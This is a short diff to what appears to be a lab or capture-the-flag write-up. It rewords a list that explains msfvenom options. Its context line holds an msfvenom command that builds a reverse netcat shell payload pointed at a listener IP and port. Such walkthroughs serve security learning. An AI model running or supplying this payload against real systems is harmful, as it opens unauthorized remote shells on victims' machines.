@@ -64,8 +64,8 @@ msfvenom -p cmd/unix/reverse_netcat lhost=10.10.8.55 lport=4444 R
 This is a breakdown of the command I am using:
 
 + -p = payload
-+ lhost = our local host IP address (this is your machine's IP address)
-+ lport = the port to listen on (this is the port on your machine)
++ lhost = local host IP address (this is my machine's IP address)
++ lport = the port to listen on (this is the port on my machine)
 + R = export the payload in raw format
 
 ![Pasted image 20240918155327](https://github.com/user-attachments/assets/e1ddfd39-2322-496b-8f9f-3bba3f6a930e)
